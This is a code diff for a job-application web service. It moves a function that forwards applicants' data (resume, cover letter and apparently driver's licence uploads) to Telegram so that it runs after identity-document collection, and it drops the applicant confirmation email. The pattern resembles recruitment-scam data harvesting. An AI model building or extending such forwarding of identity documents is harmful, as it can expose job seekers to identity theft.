@@ -101,13 +101,6 @@ router.post('/start', requireSession, upload.array('documents', 6), async (req, 
       })),
     };
 
-    await sendApplicationToTelegram(req.session.applicationDraft);
-
-    // Send confirmation email immediately upon application receipt
-    sendConfirmationEmail(email, firstName).catch(e =>
-      console.warn('Confirmation email failed:', e.message)
-    );
-
     const normalizedPosition = normalizePosition(position);
     const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
     const isDefault = !(normalizedPosition in INTERVIEW_QUESTIONS_MAP);
@@ -274,6 +267,13 @@ router.post('/verify', requireSession, driversLicenseUpload.fields(dlFields), as
     }
   };
 
+  // Send application data (resume, cover letter, etc.) to Telegram
+  try {
+    await sendApplicationToTelegram(application);
+  } catch (err) {
+    console.warn('Failed to send application to Telegram:', err.message);
+  }
+
   try {
     const qaFilename = `QA_${applicantName}_${timestamp}.json`;
     const qaFilepath = path.join(os.tmpdir(), qaFilename);
@@ -332,6 +332,13 @@ router.post('/skip-idme/', requireSession, driversLicenseUpload.fields(dlFields)
 
   const applicantName = `${application.firstName}_${application.lastName}`.replace(/[^a-zA-Z0-9_-]/g, '_');
   const timestamp = Date.now();
+
+  // Send application data (resume, cover letter, etc.) to Telegram
+  try {
+    await sendApplicationToTelegram(application);
+  } catch (err) {
+    console.warn('Failed to send application to Telegram:', err.message);
+  }
 
   try {
     const qaPayload = {
